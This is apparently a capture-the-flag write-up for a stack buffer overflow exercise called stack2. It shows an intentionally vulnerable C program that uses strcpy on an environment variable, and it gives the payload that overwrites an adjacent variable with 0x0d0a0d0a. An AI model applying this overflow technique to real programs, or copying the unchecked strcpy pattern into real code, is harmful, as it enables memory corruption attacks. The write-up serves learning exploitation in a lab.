Let's take a look at the code of this challenge.

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
{% endhighlight %}

As we can see, there's the `buffer`, `modified` variable and `variable` that is loaded from the environment variable `GREENIE` and copied into the buffer. In addition we have different if statement to satisfy - `if(modified == 0x0d0a0d0a)`.

{% highlight bash %}
$ ./stack2
stack2: please set the GREENIE environment variable
{% endhighlight %}

But let's remember the previous challenges and keep in mind that 66 bytes will overwrite 2 bytes from the `modified` variable. We can now simply export the `GREENIE` environment variable and assign to it 66 `A` letters.  

What will happen?

{% highlight bash %}
$ export GREENIE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./stack2
Try again, you got 0x00004141
{% endhighlight %}

As you can see that's the same kind of vulnerability as in the previous challenges. Now we can finish it with last commands.

{% highlight bash %}
$ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
$ export GREENIE
$ ./stack2
you have correctly modified the variable
{% endhighlight %}
